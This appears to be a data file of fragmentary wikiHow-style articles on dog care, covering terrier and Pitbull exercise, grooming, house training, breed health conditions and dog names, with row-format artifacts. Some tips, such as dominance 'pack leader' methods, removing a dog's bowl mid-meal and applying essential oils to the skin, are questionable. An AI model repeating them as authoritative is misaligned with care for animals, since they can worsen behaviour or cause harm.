, Physically demanding games will satisfy that pent up energy. You can play fetch with a ball or frisbee, or play hide and seek with treats. These games will require fun and stimulating exercise for your Jack Russell.


Mentally demanding games, such as food puzzle toys, are also good at exhausting your Jack Russell’s energy., Jack Russells would rather be outside running in the grass than trapped inside all day. Even more than this, they like exercise that involves interacting with other dogs. Take your Jack Russell to a dog park or over to a friend’s house who also has dogs and a fenced in yard. Doing this will give your dog the invigorating exercise and interaction that it needs."

Brush you Westie daily.,
Strip the dog's fur.,
Have your Westie's coat clipped regularly.,
Only bathe your Westie occasionally.,
Trim your Westie's nails regularly.,
Brush the dog's teeth.,
Check your Westie's ears.",How to Take Care of a West Highland White Terrier2," Daily brushing helps keep a Westie's coat neat and clean. This is especially important for white Westies, as their coats make dirt and debris more obvious.Use a firm-bristled brush with short, closely spaced bristles. A slicker brush also works well. Both should be available at most pet stores.In addition to keeping the dog's coat clean, regular brushing is also good for its circulation.Regular brushing also reduces shedding.

, Stripping refers to the process of plucking old, dead hair from the dog's coat. It is the traditional way to keep the Westie's coat neat and clean.Stripping is necessary if you want to enter your Westie in dog shows. It isn't strictly necessary if you don't plan to show the dog.Visit the groomer every four to six months for stripping., Another way to keep the dog's coat neat is through regular clipping of the dog's coat.Bring your dog to the groomer a clip regularly.


Clipping every four to six weeks will keep your West Highland White Terrier looking its best.

, If brushed consistently, Westies don't require frequent bathing. They have naturally dry coats which can be damaged by over bathing.Bathe your Westie if gets into mud, excrement, or similar filthy substances. Otherwise, baths a few times a year will be sufficient.
You should, however, wipe your Westie down frequently. When the dog comes inside from playing, feel free to wipe it down with a dry or lightly damp towel to remove dirt and debris clinging to the coat.This is especially important for keeping white Westies looking their best.
When you do bathe your dog, never use human shampoo. It has the wrong pH for a dog and can be bad for the coat and skin.Purchase dog shampoo at your local pet store.

, Nail care is important for Westies, as their nails are strong and fast growing.Keep an eye on the nails and cut them whenever they begin to get long.


Westie's nails can split and crack if not kept trim and neat.
Use a nail trimmer or grinder made for dogs. Don't use human nail clippers.
Be careful careful not to cut their nails the quick. Cutting nails too short can be painful for the dog and cause bleeding.If you aren't comfortable cutting your dog's nails, have a groomer do it.

, Like a person, a dog needs its teeth brushed to avoid decay, remove plaque, and prevent gum disease.Brush your Westie's teeth daily, if possible.Use a dog toothbrush and toothpaste, available at any pet store. Never use human toothpaste, which can make your dog very sick.

, A West Highland Terrier needs its ears checked once a week. Look for wax buildup and redness.As necessary, clean the dog's ears with a cotton swab and pH balanced cleaner.


If you note a foul smell, see mites, or notice that there is frequent, excessive wax buildup, visit the vet and get the dog's ears checked."

Choose the right food.,
Go on a run or long walk.,
Play fetch.,
Avoid leaving your dog home alone for hours on end.",How to Keep a Pitbull1," Pitbulls are high energy dogs, which mean they need a lot of food. Choosing the food with the proper ingredients is equally as important as making sure your dog gets enough food. The better nutrition your Pitbull has, the happier they’ll be.Ask your vet what food is best for your Pitbull.
Consult your local pet food and supply store to see if they have any recommendations.;
, Pitbulls are very energetic breeds that need a lot of exercise, especially in their younger years. Going on regular runs or long walks will help them burn off their large amounts of energy.


If you already have an exercise routine, try moving it outdoors so your dog can join.
Go until they are tired. Remember, a tired dog is a happy dog.

, Playing fetch is a great way to exercise your Pitbull until they are out of energy. Fetch also provides mental stimulation and often engages a dog’s sense of smell.


Play fetch with a frisbee, tennis ball, or dog toy.
Try and play fetch with an object that is harder to find to challenge your dog’s problem solving skills., Pitbulls are not a “hands off” breed and need a lot of attention and a lot of sustained activity. If your dog is left home alone, chances are they will get bored and may start exhibiting behavioral issues.If you anticipate being away from home for an extended period of time, ask a friend to stop by every few hours to check on the dog and play with them.
If you work a fulltime job that requires you to be away from home, a Pitbull might not be the breed for you.
If you happen to live in a house or apartment too small for a dog make regular weekly appointments with a canine daycare service while you’re away.

Assert yourself as the pack leader to eradicate excessive jumping and barking.,
Use clicker training.,
Ignore the behavior.",How to Live With a Hyper Jack Russell Terrier2," Your dog probably thinks it’s the pack leader if it excitedly barks and jumps on you and guests when they walk into your home. By taking steps to become a calm and assertive pack leader, you can train your Jack Russell to not exert its energy in destructive ways. Some ways you can do this are:


Don’t give your dog affection right when you walk in the door.
Correct the behavior by firmly and clearly moving the dog to the side.
When guests arrive, get into the habit of commanding your dog to sit patiently as they enter., Buy a clicker at a pet store for as little as $5 and use it to train your dog through positive reinforcement and association. If you make eye contact, click the clicker only when you want your Jack Russell to act calmly, and then reward this behavioral correction, your dog will quickly learn that calmness is rewarded., Ignoring your Jack Russell when it’s jumping and barking excessively will communicate that misbehavior won’t get it anywhere. Your dog just wants attention, whether positive or negative. Ignoring your dog keeps it from seeking attention in this negative, hyperactive way."
"
Give your dog a job.,
Remain calm and collected.,
Try aromatherapy.",How to Live With a Hyper Jack Russell Terrier3," Jack Russells specifically are happiest and most fulfilled when they have a job that they’re responsible for. Try to give your dog a job that fits the strengths of the breed. For instance, Jack Russells love to dig and hunt. If you give your dog the task of taking care of rodents in the yard and reward your dog when it does well with this job, then it probably won’t have as much hyper energy to exert.If you don’t have a yard for your Jack Russell to dig in, you can give it a cleaning job by commanding it to put away toys or give it a notification job by commanding it to bark when the mail truck or school bus drive by your home. Reward these actions with treats., Your Jack Russell may react to or reflect the energy that you put off. Do your best to have a calm and assertive presence. If you’re stressed about your job or frustrated about an argument you had, your dog will pick up on and be impacted by that nervous energy., Dogs sense the world first and foremost with their noses, so aromatherapy might have a powerful influence over your Jack Russell. Just like it has a calming effect on humans, lavender can relax dogs as well. Ask your veterinarian about other scents that may be specifically effective for calming your Jack Russell as well as safe application and dispersal methods.Sometimes essential oils are safe to apply directly to your dog’s skin, but you may want to consider purchasing a dog aromatherapy pre-mixed spray that’s already properly diluted and safe to spray throughout your home."

Use positive reinforcement.,

Train your Boston Terrier throughout his life.",How to Train Boston Terriers," Crate training is an important component of training your Boston Terrier. It will not only help with house training, but also allow him to see his crate as a place of safety and comfort. His crate should be large enough for him to stand up and move around in, but not so large that he can create a separate ‘bathroom’ space.


The ideal crate size for Boston Terriers is 24 x 30 inches (61 x 76 cm) or 24 x 36 inches (61 x 91 cm).;
, To make the crate look more inviting to your Boston Terrier, put some ‘creature comforts’ inside of it, including comfortable bedding, his water bowl and some toys. The bowl should be sturdy enough that he can’t tip it over. Some of the toys should be chew toys so he can learn what he should chew on (instead of your shoes or furniture).Boston Terriers love to chew. Crate training your Boston Terrier can prevent him from being destructive in your home when you are not home.Examples of good chew toys are high-impact rubber balls and rawhide chew toys., Your Boston Terrier may be a little hesitant to enter the crate at first. To encourage him to go in, place some food kibbles or dog biscuits in the crate. You may want to lure him inside in phases: at mealtime, place his food bowl just outside the crate, then in the doorway, then the back of the crate.When your Boston Terrier enters the crate on his own, reward him with lots of verbal praise and maybe even a treat. The more positive reinforcement he gets from you, the more he will make a positive association with being inside the crate.
Initially, it may help to leave the crate door open so he can enter the crate whenever he wants.
As your Boston Terrier becomes more comfortable with entering the crate, consider adding a verbal command, such as ‘kennel.’ When he goes in after he hears your command, immediately give him a treat and verbal praise.Be patient with your Boston Terrier. It may take some time for him to enter the crate on his own. Work at his pace.

, When your Boston Terrier can enter the crate on his own, begin closing its door and leaving him inside. Close the door for a few seconds, wait for him to calm down (if necessary), then open the door again and give him a treat and verbal praise. You can then work on closing the door, leaving the room, then returning at random time intervals.Gradually work up to leaving your Boston Terrier in the crate overnight. If you have a puppy, remember that he can’t hold his bladder for very long—you will still need to take him outside regularly to eliminate.Boston Terriers can develop separation anxiety, so proper crate training can help him feel calm and comfortable when you are not home., The sooner you can start house training your Boston Terrier, the better. Fortunately, Boston Terriers tend to be very tidy dogs, so your Boston Terrier probably will not want to make a mess in your home.


It may help to keep him confined to a small area (e.g., small bedroom) in your home until he is fully house trained. If a small bedroom is not available, consider using baby gates to section off a portion of a larger room.It may take up to 6 months to house train your Boston Terrier, so be patient with him., Your Boston Terrier should go to the bathroom outside, in the same spot. By having an established bathroom area, your Boston Terrier will be able to leave his scent in the area and make it his territory.If you have a puppy, you may need to set up an indoor bathroom spot in the confined area where he can eliminate when you are away from home. You can use newspapers in the bathroom spot. Keep in mind that this may prolong housetraining., Boston Terriers do best when they have a steady routine.With a regular bathroom schedule, your Boston Terrier will learn when he should go to the bathroom. If you have a puppy, take him outside after his first meal of the day, and each time he wakes up from a long nap.Other times to take your Boston Terrier out are after drinking water and playing.Keep in mind that a puppy can hold his bladder for about 1 hour per month of age, up to 12 months.Adult Boston Terriers do not need to eliminate as frequently as puppies, but should still be on a set bathroom schedule.

, If you have a backyard, it may be tempting to simply open the door and let your Boston Terrier outside to go to the bathroom. However, he may not eliminate that way, making an indoor bathroom accident more likely. During house training, put your Boston Terrier on a leash and walk him outside to your backyard., Since Boston Terriers aim to please, your own Boston Terrier will need your praise when he goes to the bathroom outside. Give him plenty of verbal praise (‘Good boy!’ or ‘Good job!’) after he finishes eliminating.You could also give him a small bit of a tasty treat.

, Don’t be surprised if your Boston Terrier pees or poops in your home during house training. If you catch him in the act, say ‘No!’ firmly, pick him up, put him on leash, and take him outside.If you see the accident after the fact, clean it up with an enzymatic cleaner that will remove the odor and prevent him from going in the same spot again.Reward your Boston Terrier when he finishes eliminating outside. This positive reinforcement will encourage him to wait until he is outside to eliminate.

Do not rub your Boston Terrier’s face in the urine or feces. This will not teach him that he’s done something wrong, since he will not associate the punishment with what he did. In fact, this may make him fearful of you., Although your Boston Terrier is very intelligent, he may become confused if you try to teach him multiple commands at once. If he becomes confused, he may also become discouraged and want to quit training.It is better for him to completely master one command before moving on to the next.


Basic commands include sit, stay, and heel.

Enrolling your Boston Terrier in an obedience class can help you teach these basic commands. Ask your veterinarian or other dog owners for recommendations on good obedience classes.

, It may take your Boston Terrier only a few tries before he masters a particular command. If that is the case, simply move on to the next command. Since Boston Terriers can become discouraged if they have to do the same thing numerous times, stop teaching a command as soon your Boston Terrier masters it., Daily training will help your Boston Terrier learn and master commands more quickly. However, since dogs have short attention spans, your training sessions should be no more than about 10 minutes. You can have multiple training sessions in a day as long as you keep them short and allow long breaks in between., Consistent and immediate positive reinforcement is essential to training a Boston Terrier. Each time your Boston Terrier correctly responds to a command, reward him with a treat and verbal praise. Give the treat within about 2 to 4 seconds of him following the command so he knows for what he is being rewarded.Always use verbal praise when giving your Boston Terrier the treat. That way, he will learn to associate praise with treats.Boston Terriers are motivated by treats.Choose dog treats that your Boston Terrier can eat quickly and easily (nothing too crunchy).

, Boston Terriers can be very sensitive to tone of voice. Shouting at your Boston Terrier, or using an angry-sounding tone, can be discouraging to him, causing him to shut down.Keep your tone bright and positive, yet firm.


Do not raise your voice at your Boston Terrier, even if you become angry or frustrated. A loud tone of voice may scare him., Boston Terriers can have trouble breathing, since their faces are short and compressed. For this reason, train your Boston Terrier inside when it is hot, humid, or very cold outside. If you do work with him outside in extreme weather, give him access to plenty of water and limit your training sessions to 10 to 15 minutes., Lifelong training will help your Boston Terrier remember how to be a well-behaved dog. Even if he mastered every command you taught him, he will need continual training to ensure he doesn’t forget what he learned.After about 3 to 6 months of basic training, you can start teaching your Boston Terrier tricks, such as rolling over and playing dead.

Buy really durable chew toys.,
Feed your Jack Russell a nutritious diet.",How to Keep a Jack Russell Terrier Happy," Training starts from day one as you teach your puppy where the toilet is and that his crate is a safe place. Young puppies learn quickly so take advantage of this to teach basic commands. More complex training can take place from 8 weeks, but keep the sessions short.Keep the session to as many minutes as the puppy is weeks old. Spread the sessions out to 2 or 3 times a day. While it's important to teach the basics, like 'sit', 'down', 'stay' and 'heel,' he should have more obedience training.


If you don't train your Jack Russell from an early age, he will continue fighting to get his own way. They're strong willed dogs that will rule over their owners if not properly trained.;
, Take an obedience class with your puppy to teach him canine good citizenship. You'll learn how to properly train your dog and he'll be able to socialize with other dogs and humans in a controlled setting.Training a puppy or dog is a matter of repetition, reward, praise and patience. Never hit, scold, or otherwise negatively discipline a puppy while you are training him.Instead, keep your tone of voice positive since dogs quickly learn to pick up on displeasure in their owner’s voices.

, If you've gotten a Jack Russell Terrier puppy, you'll need to housetrain him. Start by choosing a small room in your house to keep your puppy in when you're not at home. Lay newspaper all over the floor for your puppy to use. Clean the paper every day, until you start noticing your puppy using a preferred spot in the room. Then you can slowly start to get rid of the paper in the areas that your puppy isn't using.Once your puppy is using only a small area of paper, you can move the paper to a place in your house designated as your puppy's place to potty.

, If your dog starts having trouble relieving himself in the appropriate place in the house or outside, retrain your dog. Take him outside every 3 hours and after he eats or naps. Remind your dog that it's time to relieve himself. If he eliminates, give him lots of praise, like ""good boy."" If he doesn't, bring him inside, wait 15 minutes, take him outside and try again.Take your dog to the same spot every time you go outside. This way, your dog will associate the spot with relieving himself.

, Your dog may become anxious when you leave him throughout the day. You may notice your dog scratching, vomiting, urinating inappropriately, pacing, or being aggressive (usually in your absence). Signs of separation anxiety mean your dog depends on you and misses you, rather than being signs of misbehavior.To combat separation anxiety, don't lavish your dog with attention right before you leave the house. Instead, ignore him for 15 to 20 before you leave and for 20 minutes once you return. This will keep his excitement levels low., Chasing can lead to accidents or injuries to either your Jack Russell or the animal he's chasing. To prevent this, make sure your dog sits immediately on command and stays. Or you could desensitize him to cats or other small animals.Desensitizing can also work with other situations. What it takes is patience, consistency, and time to train the puppy to react in a manner which is pleasing to you. You can do this once you have taught the dog a rock solid ""Sit.""

, When the puppy sees the cat and reacts aggressively (lunges, barks, tries to run) tell him sit. When he obeys give him a treat. Let him watch the cat and whenever he acts in an aggressive manner, give the sit command followed by a treat when he complies.


When you feel your puppy is relaxed while watching the cat, you can gradually introduce the cat to the dog (bringing carrier closer, removing the gate) but keep the dog on leash until you feel he will immediately comply with the sit command.
This may take several sessions (remember to keep them short) and many days, but eventually he will learn a cat is not to be chased., Offer tiny tasty snacks, like bits of chicken or cheese, to reward your puppy when he obeys your commands. If you're just starting to teach a new command, offer a reward when you notice progress towards performing the task.Offer verbal rewards and praise, like saying, ""good boy,"" or ""yes!"" as well as petting during the training session.


Don’t try to train a puppy when he is hungry, tired, or too energetic. Wait until the puppy is relaxed but still responsive to you.

, Socialization is the process of introducing a puppy to new situations so he learns to interact properly. Introducing your puppy to new situations and people teaches him that the right things (such as other friendly dogs, cats, and people) are not to be feared. Fearful dogs can become “aggressive” if they bite and bark when they cannot run away from the situation.Running away from things that should not be feared can be dangerous. Dogs can run into traffic and get hit by vehicles or run away from home and get lost., Once he's current with vaccinations, you can take him to parks, for walks along busy streets, other dog-friendly places, or enroll him in obedience school. If there are no obedience classes in your area or if you are waiting for one to start up, you can start on basic commands and socialization. You can also take him to crowded areas so he can watch new people and things.You should try exposing your dog to as many different things as possible. For example, take him for a short car ride and stop every once in a while to let him check out his surroundings. Or, invite friends and their pets over to meet your dog. Let him interact with all different types of people and animals.Don't force or rush your dog to socialize. If he's fearful around new animals, don't constantly make him interact. Instead, take it slow and move at a pace that's clearly comfortable for him., If you do, your Jack Russell will learn to be nervous and aggressive with other dogs. Instead, try to keep him on his leash and keep him beside you when other dogs approach. If a stray or aggressive-looking dog comes up, leave the area quickly with your Jack Russell in tow.


On the other hand, Jack Russells can be overly aggressive towards other dogs, even other Jack Russells., Since Jack Russell Terriers are hunting dogs, it's in their nature to be aggressive. You should never leave your dog unattended with another dog, even another Jack Russell Terrier. For this reason, you shouldn't have a Jack Russell Terrier around small children, small animals or pets, or cats.To curb some of your dog's aggression, keep him well exercised and active. Bored Jack Russell Terriers are more likely to be aggressive or destructive.

, Since your Jack Russell may think he's the top dog, let him know that you are the master. For example, after he's learned the sit command, make your Jack Russell sit for his food before you let him eat it. Once in a while, pick up his bowl while he's eating to make sure he knows you're the “top dog.""


Be firm and consistent with him. Don't just let him do whatever he wants., You can take him for a long walk or play active games. Jack Russells are very smart and will keep you hopping unless they can find an outlet for all their pent-up energy. Playing active games such as fetch will help burn off their excessive energy. Terriers love this game.


Jack Russells love when you chase them for the toy. Don't make this a habit, or your dog will learn not to come to you when you call him. Instead, teach him the ""drop it"" command. This way, you're still in charge of the game., These can help burn your Jack Russell's energy. Kongs are great toys because they're almost impossible to tear apart.You can pack them full of peanut butter and treats to keep you Jack Russell busy and working for his snacks.


Generally, stuffed toys aren't great for terriers, even though they love them. Your Jack Russell will probably tear it apart and try to eat it piece by piece leaving your home covered in stuffing.

, Choose a high-quality dog food that isn't filled with grains or preservatives. Instead, look for a dog food that lists meat, such as lamb or chicken, as a top ingredient. Since dog food products vary, follow the specific feeding instructions on the package. You'll probably also need to adjust the amount food you give your Jack Russell Terrier based on his age, activity level, and size.As a general guideline, a 12 inch Jack Russell Terrier should weigh around 12 to 13 pounds.

Clicker train your dog.,
Provide plenty of toys.,
Watch for digging.,
Give the dog moderate exercise.",How to Take Care of a West Highland White Terrier3," Use a clicker to reinforce desirable behavior.When the dog does something you'd like it to learn to do on command, click the clicker and give a treat, while saying a command word. Soon the dog will learn to do the behavior on command.


Punishment doesn't work well for Westies.When trying to teach the dog not to engage in undesirable behaviors, redirect it to a positive behavior with a command, click, and treat.

, Westies love squeaky toys. Make sure your dog has plenty of toys to chew on and fling around.This will reduce the likelihood of the dog becoming destructive in your home.


Choose hard rubber or latex toys that your Westie can chew on. Regular chewing is good for your dog's teeth and gums. Avoid toys made of brittle plastic or soft vinyl, as both can be a choking hazard.If you give your Westie rawhide toys, always supervise the dog while they play. These toys can also lead to choking.

, One behavior that many Westies engage in that people aren't too fond of is digging.A westie can dig up your garden or damage the floors in your home with this behavior.


The best way to stop this behavior is to catch the dog in the act and redirect from digging to a trained behavior like sitting or lying down. If you do this routinely, the dog will usually unlearn the digging behavior.
Digging seems to be an acquired habit. If you bring home a new West Highland Terrier and it doesn't dig, that doesn't mean it won't develop the behavior later. So, keep your eye open for this.

, Westies aren't lazy dogs, but nor are they an extremely high-energy breed. One to two daily walks or play sessions a day is usually adequateA total of an hour of exercise is adequate for most Westies.Most Westies will be calm and relaxed indoors if you exercise them twice a day. If you don't, they can become destructive as a way to relieve boredom and let out excess energy.

Watch for signs of Craniomandibular Osteopathy.,
Look for signs of Legg-Calve-Perthes Disease.,
Be vigilant of cataracts.,
Look out for Pulmonary Fibrosis.,
Keep an eye out for signs of Patellar Luxation.,
Take your Westie in for regular vet visits.",How to Take Care of a West Highland White Terrier4," Like any dog breed, Westies are prone to certain health conditions. One that affects many Westies at a young age is Craniomandibular Osteopathy, an irregular enlargement of skull bones.This condition most often affects puppies between four and eight months.
Warning signs include swelling of the jaw, drooling, and difficulty opening the mouth.
There is no cure for this disorder, but a careful diet can alleviate the worst symptoms.
Westies with this condition will experience jaw conditions for the rest of their lives.

, This condition causes a decreased blood flow to the head of the femur (the large bone in the rear leg). The femur can begin to disintegrate at the point where it connects to the pelvis.Warning signs include limping and visible atrophy of rear leg muscles, usually in puppies about six months old.
This condition can be corrected by surgery if caught soon enough.

, This is a common eye condition that causes the lense of the eye to become opaque, harming the dog's vision.The eyes of a dog with cataracts will take on a cloudy appearance.
This condition is most common in older dogs, but in West Highland White Terriers can show up in juvenile dogs.
Cataracts can be removed with surgery.

, This disease, sometimes called ""Westie Lung Disease,"" causes scars in the lungs that can block the flow of oxygen into the blood.Symptoms of this condition vary from one dog to the next. They can include a general weakness or loss of energy, rapid breathing, a crackling sound in the lungs, a dry cough, shortness of breath, and other problems breathing.
This disease has no cure. If discovered early however, preventative measures can make the dog more comfortable and extend its life. Generally, owners of Westies with this condition are encouraged to limit the dog's exercise and keep the house cool to limit scar growth.

, In this condition, the knee joint of the dog's rear leg can slide in and out place. This condition, which typically affects smaller dogs, can cause pain and even cripple the dogSevere cases require surgery to allow the dog to continue using the leg., Even a health dog should get a check up regularly to catch any potential problems before they become severe.


Visiting the vet about once a year is adequate for most healthy dogs.Older dogs may require more frequent veterinary attention.

It’s important to do as much research into your dog’s history as possible to understand their behavioral issues as best you can.If you adopted or rescued your dog, get in touch with the shelter to see if they have any information on your Pitbull’s history.

, Socializing your Pitbull is a great way to keep your dog happy while also providing them with the necessary exercise and mental stimulation they need. However, as Pitbulls have a reputation for being aggressive, you may want to use caution when they’re socializing with other dogs.


Socialize your Pitbull as early as possible. The earlier they begin interacting with other dogs, the more likely they are to develop tolerance, avoid aggressive behavior, and enjoy social interaction.When ready, take your dog to an off-leash dog park.
Taking your Pitbull for pack walks is a great way to combine exercise and social interaction.
If your Pitbull engages in an aggressive encounter with another dog it is important to intervene as soon as possible and to use the right tools. Consulting guides on addressing Pitbull aggression will provide you with the necessary information should your dog aggressively engage with others.

, House training can take quite a long time with Pitbull puppies, but it can be done with enough patience and effort. Establishing a routine, whether that be crate training or taking them outside, is the key to efficiently house training your Pitbull.Let your dog outside first thing in the morning and every night before bed.
Puppies have limited bowel and bladder control and need to be taken outside at least once an hour.Don’t leave your Pitbull in their crate for more than 6-8 hours a night.

, In order for any training to be effective you need to establish consistent structure. Most behavioral issues are rooted in the owners, not the dogs themselves.

"
Play with your Pitbull.,
Take a behavioral class together.,
Spend quality time together.,
Learn your Pitbull’s personality.",How to Keep a Pitbull3," Playing with your dog will often involve activities like chasing or wrestling as they are built to withstand more physical activity than other dogs. Pay attention to your dog’s body language and notice when they are no longer interested in playing or are getting frustrated.Spend fifteen minutes playing with your dog when you get home from work.

, Taking a behavioral training class with your Pitbull is another way to create a firm bond with your dog and learn a new skill or behavior. Teaching and learning from your Pitbull will help establish a bond that only the two of you will have!


Taking a behavioral class is also a great way to access resources and utilities you might not otherwise have, like agility and obstacle courses.

, Although it is important to establish routines and good behaviors, it is equally important to enjoy your dog as well. Going for short outings or trips, buying a new toy, or giving your dog treats are all great ways to spend time and show appreciation.


Instead of your daily exercise routine, take your Pitbull on a hike.
Show affection for your dog by petting, rubbing, and stroking them.

, Pitbulls can often have complex histories due to their frequent breeding and associations with fighting and aggression. Although researching your dog’s history and past behaviors is useful to everyday routines, taking the time to understand your Pitbull’s current behaviors, ailments, or moods will help you strengthen your bond and prepare you both for a mutually beneficial relationship.

Brush your APBT’s coat at least once a week.,
Wipe its coat.,
Clean your APBT’s ears once a week.,
Brush its teeth at least once a week.,
Trim its nails about twice a month.",How to Groom Your American Pit Bull Terrier1," Use a rubber curry brush to groom your pet daily to weekly. Brush its fur in circular motions to enhance its circulation and distribute its skin’s natural oils. Go over your dog's back, the top of its neck, and the front of its legs; brush gently on more sensitive areas such as the bottom of its neck, stomach, or back of its legs.Besides keeping your Pittie’s coat healthy and lustrous, brushing helps control shedding and dust by removing hair and dead skin cells.;
, Use a damp, clean cloth to wipe your APBT’s fur after brushing. Be sure to move from its neck to tail, following the grain of its fur. Press firmly enough to remove any lingering hair or dirt, but do not rub.Rubbing or scrubbing your Pittie’s fur will encourage any dirt or debris in its coat to cling to its skin instead of removing it.

, Pitties have perky ears that are susceptible to infections, especially if they’re cropped. Keep your pet’s ears clear of wax and dirt by cleaning them with a mild canine ear cleaner.Drip just enough cleaner into your APBT’s ear canal to fill it. Then, massage the base of your pet’s ear for 10-20 seconds, making circular motions with your pointer and middle fingers. Repeat with your dog’s other ear.Once you’ve massaged both ears, let your dog shake its head to release the cleaning solution and whatever debris it has loosened. Gently wipe any liquid, dirt, and wax out of its ears using a clean cotton ball.To prevent any damage to your pet’s inner ear, avoid using cotton swabs or poking into its ear canal.
While you’re at it, be sure to watch out for any symptoms of infection, such as redness, rashes, swelling, discharge, or foul smells. If you do notice any of these signs, make an appointment with your vet., Regular oral hygiene is important to keeping your Pittie clear of bad breath, tartar buildup, and bacterial infections. Start by getting canine toothpaste and an angled canine toothbrush that is sized appropriately for your APBT.Push up your APBT’s lips to expose its teeth, and brush them quickly with a gentle circular motion along the gumline. You only need to do the front-side of your dog’s teeth.Do not use human toothpaste. It can be poisonous or harmful to dogs, especially if it contains fluoride or baking soda.
Dog toothpaste doesn’t need to be rinsed and comes in meaty flavors that your pet will enjoy. It’ll make this grooming task much easier for you and your pooch.
You can also help prevent plaque buildup by feeding your dog dry kibble and giving it dental chews.

, Clipping your APBT’s claws will keep them from cracking or scratching. The frequency will depend on your dog’s activity level and environment. Use a scissor-like Miller’s Forge trimmer designed for medium-sized dogs, and have some styptic powder handy to treat any cuts.Pick a time when your dog is tired and relaxed, such as after a walk or feeding. That way, it’ll be less likely to squirm.
Go paw by paw. Take one of your dog's paws, holding the foot firmly by the ankle in the palm of your hand.Look for the “quick,” a nerve ending that’s usually visible in the underside of your pet’s claw as a tiny red tube. You should only clip the tip that extends beyond the nerve. Play it safe by erring on the side of leaving too much rather than painfully cutting the quick.If your Pittie doesn’t like to have its paws touched or is squeamish, clipping its nails might be a two-person job. Have one person hold your dog and speak to it reassuringly while the other trims. If that doesn’t work, consider leaving this task to a professional.If you accidentally cut the quick or see blood, firmly press the styptic powder into the end of your Pittie’s nail to stop the bleeding. Keep your dog still and reassure it that it's all right."

Choose the right shampoo.,
Bathe your APBT infrequently.,
Lather and rinse its coat.,
Dry your Pittie.",How to Groom Your American Pit Bull Terrier2," It’s best to get a mild, hypoallergenic dog shampoo since human shampoos can easily irritate canine skin. It should be free from fragrances and synthetic chemicals.Alternatively you can make your own dog shampoo by mixing together 1/3 cup glycerin, 1 cup mild dishwashing soap, 1 cup white vinegar, and 1 quart water. Put all these ingredients into a liter-sized bottle, and shake before each use., Frequent washing will dry out a Pittie’s skin and deplete the natural oils in its coat. With their fine fur, most APBTs only need a couple baths per year. You should bathe your pet only when necessary and no more than every six weeks unless otherwise directed by a vet.If your dog gets dirty frequently, stick to rinsing off the mud with plain water rather than bathing it more often.
You can bathe your dog in a tub, shower, or outside using a hose with a gentle spray nozzle. Your pooch will be more likely to stay put if you wash it in a controlled or closed space using a comfortably warm water temperature.
It’s a good idea to brush your Pittie ahead of time to remove any loose hair or dirt before it jumps in the bath.

, Wet and lather up your Pittie with dog shampoo from its neck down. Rinse your pooch with luke-warm water using a detachable shower head, pitchers of water, or a hose with a gentle spray nozzle.Don’t soap up your pet’s head to avoid getting water and shampoo in its ears and eyes.
Be sure to rinse your APBT’s coat thoroughly until the water runs clear so that there’s no shampoo left to dry out its skin or tempt your pet into licking it.

, Once you’ve given your dog a good rinse, let it shake off any excess water. Then, wrap your pet in a big, absorbent towel, and gently pat it dry.Do not let your dog out into cool weather until it has dried completely. An APBT’s short, single coat and low body fat mean that it can get cold very easily.

Gather materials.,
Remove tangles and dead hair.,
Use a bristle brush.,
Clean your dog’s ears.,
Brush your dog’s teeth.,
Clip their nails.",How to Groom a Silky Terrier1," Your silky terrier is named for its lovely fur. The most important aspect of maintaining this healthy coat is to brush your dog daily. You are going to need both a slicker brush and a bristle brush. Both items can be found at your local pet store.


Slicker brushes contain fine wire bristles. These brushes are especially useful for removing tangles and mats.
Bristle brushes come in sizes, according to the spaces between bristles and the bristle length. For a longer coat (such as a silky), you want wide-spaced, long bristles.;
, First, use the slicker brush to gently remove tangles and dead hair. Brush from the top of the head, working your way down the neck. Then, move along the sides, belly, and legs. Always keep the straight parting in the coat along the spine of the dog, and always brush towards the ground., After you have gone over your dog with a slicker brush and removed any major knots, repeat this method with a bristle brush. Once again, be sure to maintain the parting in the coat, and always brush toward the ground.This will leave your silky terrier with a shiny, beautiful coat.

, It is important to keep your dog’s ears clean. To avoid getting soap or water in your dog’s ears, it is best to clean the ears outside of the bath.Moisten the corner of a washcloth with warm water and wipe around the ear opening.
Do this 1-2 times per month.

, Dental hygiene is also important. You can buy a dog toothbrush and dog toothpaste from your local pet store. Make sure that your dog is comfortable with your hand in their mouth before you begin, and allow your dog to sample the toothpaste.


Place your dog in your lap facing away from you.
Using your non-dominant hand, carefully fold their lips back.
Holding the toothbrush in your dominant hand, brush the front teeth.
Using your non-dominant hand, try to pry open your dog’s mouth.
Finally, holding the toothbrush in your dominant hand, brush the back teeth and molars.
Offer your dog a treat and a drink of water.

, About once a month, you will also need to clip your dog’s nails. You can purchase a set of dog nail clippers at your local pet store.First, you must identify the “quick” (a dark area inside the nail with blood vessels ).
Place your dog in your lap facing away from you.
Hold your dog’s paw firmly with one hand.
Slide each claw through the small hole in the nail clippers.
Depress the nail clipper above the quick.

Practice saying each name.",How to Find Unique Dog Names," Unique might refer to non-traditional spellings of names, unusual pronunciations, a name that most people don’t associate with dogs, or an obscure name or word. Once you've determined what sort of unique name you'd like, whether it is an obscure name or an unexpected way to spell a name, you can use this to guide your search.;
, While the perfect name might come to you in a spark of inspiration, you’ll probably need to look around for ideas. Think about the names of characters in your favorite books, movies, and shows. A sci-fi lover might realize Leia or Spock is the perfect name for their pet. Or, a literature fan might choose Atticus or Bilbo as a name.If you have a favorite character from a TV show or movie, you could think about their personality. Does the character’s personality mirror your dog’s personality? This could be a good way to link the two and provide you with inspiration for their name.

, This is a great way to identify names that you might not have otherwise thought about. Say you’re interested in cooking and love to go out to eat. Food names like Pickles, Thyme, Sage, and Peanut are all fun names to give to a dog. A big sports fan could use their favorite player’s first or last name as inspiration for their pooch’s name, or even name them after a sports team. Whatever your hobbies or passions are, you can find unique ways to reference them in your dog’s name.


Think outside of the box and use words that aren’t usually used as names, like jargon specific to your hobby, and see whether you like the way it sounds.

, It might sound counterproductive in your search for a unique name, but there are lists available of unique names for pets.These lists can serve as a source of inspiration and they can help you to think outside of the box when it comes to names.


Some sites will organize dog names by characteristics, like funny or cute, and by themes, like historical or food. These can be helpful to gather ideas from, or to match your dog’s personality with a name., Names of cities, states, and countries are a unique source of inspiration. You could choose a location that honors a significant place in your own life, like your hometown or where you attended school.


Think about the geographic origin of your dog’s breed. You could choose a name from that country’s language. For instance, if you have a German shepherd, you could name them a German name like Dieter or Giselle. Or, if you have a Shiba Inu you could choose a Japanese name like Akira or Kazuki.

, You might love a more traditional dog name, like Max or Daisy, but still want to find a unique twist. Consider translating the name into another language, like Spanish or French. This way, Daisy could become Margarita in Spanish or Marguerite in French. You can also translate other names that you like, or you can select words from foreign languages that aren’t traditionally used as names.


